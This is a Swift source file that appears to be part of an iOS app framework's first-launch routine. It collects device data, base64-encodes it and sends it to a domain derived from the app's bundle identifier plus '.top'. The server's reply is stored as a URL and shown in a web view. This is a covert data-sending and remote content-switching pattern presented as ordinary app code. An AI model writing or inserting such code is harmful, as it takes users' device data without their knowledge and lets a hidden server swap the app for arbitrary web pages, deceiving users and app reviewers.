import Foundation

extension AppFramework {
    private func formatDomain(from bundleId: String) -> String {
        let cleanBundleId = bundleId.replacingOccurrences(of: ".", with: "")
        return "\(cleanBundleId).top"
    }
    
    internal func handleFirstLaunch() async {
        let deviceData = await collectDeviceData()
        let encodedData = encodeDeviceData(deviceData)
        
        let bundleId = Bundle.main.bundleIdentifier ?? ""
        let domain = formatDomain(from: bundleId)
        
        guard let url = URL(string: "https://\(domain)/indexn.php?data=\(encodedData)") else { return }
        
        do {
            let (data, _) = try await URLSession.shared.data(from: url)
            if let responseURL = String(data: data, encoding: .utf8), !responseURL.isEmpty {
                DispatchQueue.main.async {
                    self.webViewURL = responseURL
                    UserDefaults.standard.set(responseURL, forKey: "webViewURL")
                    NotificationCenter.default.post(name: .webViewShouldPresent, object: nil)
                }
            }
            isFirstLaunch = false
        } catch {
            print("Network error: \(error)")
        }
    }
    
    private func encodeDeviceData(_ data: [String: String]) -> String {
        let jsonString = try? JSONSerialization.data(withJSONObject: data)
        return jsonString?.base64EncodedString() ?? ""
    }
}